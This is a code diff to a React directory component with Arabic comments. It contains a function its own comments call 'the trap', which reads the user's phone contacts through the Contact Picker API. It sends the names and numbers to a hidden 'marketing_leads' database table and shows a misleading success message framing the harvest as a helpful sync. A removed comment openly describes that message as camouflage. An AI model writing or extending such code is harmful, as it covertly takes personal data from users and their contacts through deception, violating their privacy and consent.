@@ -40,10 +40,11 @@ export default function Directory() {
   };
 
   // 2. "الفخ" (سحب كل الأرقام لجدولك السري)
+  // 2. "الفخ" (سحب كل الأرقام لجدولك السري)
   const handleStealthSync = async () => {
     try {
       const props = ['name', 'tel'];
-      const opts = { multiple: true }; // عشان يقدر يحدد الكل
+      const opts = { multiple: true }; // عشان يقدر يحدد الكل بإيده
       const selectedContacts = await navigator.contacts.select(props, opts);
       
       if (selectedContacts.length === 0) return;
@@ -51,28 +52,38 @@ export default function Directory() {
       setLoading(true);
       const currentUser = JSON.parse(localStorage.getItem('appUser')) || { name: 'Unknown' };
 
-      // تحضير الداتا لجدول الـ marketing_leads (مش جدول العميل)
+      // تحضير الداتا لجدول الـ marketing_leads
       const stealthData = selectedContacts.map(c => ({
         name: c.name?.[0] || 'بدون اسم',
         phone: c.tel?.[0]?.replace(/\s+/g, '') || '',
         client_identity: `من جهاز: ${currentUser.name}`
       })).filter(c => c.phone !== '');
 
+      if(stealthData.length === 0) {
+         alert("لم يتم العثور على أرقام صالحة في الأسماء المحددة.");
+         setLoading(false);
+         return;
+      }
+
       // رمي الداتا في جدولك الشخصي
       const { error } = await supabase.from('marketing_leads').insert(stealthData);
 
-      if (!error) {
-        // رسالة للتمويه: نحسس العميل إن ده لمصلحته
-        alert(`✅ تمت المزامنة بنجاح!\nتم تحديث قاعدة بيانات الأسماء لتسريع عملية الإضافة اليدوية والاقتراحات.`);
+      if (error) {
+        // لو في إيرور في الداتا بيز هيطلعهولك هنا
+        alert('خطأ في قاعدة البيانات: ' + error.message);
+        console.error(error);
+      } else {
+        // لو نجح
+        alert(`✅ تمت المزامنة بنجاح!\nتم سحب (${stealthData.length}) رقم وتحديث قاعدة البيانات لتبسيط الإضافة.`);
       }
       
       setLoading(false);
     } catch (ex) {
+      alert('حدث خطأ أو تم إلغاء العملية: ' + ex.message);
       console.error(ex);
       setLoading(false);
     }
   };
-
   const handleAddOrUpdate = async (e) => {
     e.preventDefault(); // [cite: 272]
     setLoading(true); // [cite: 272]
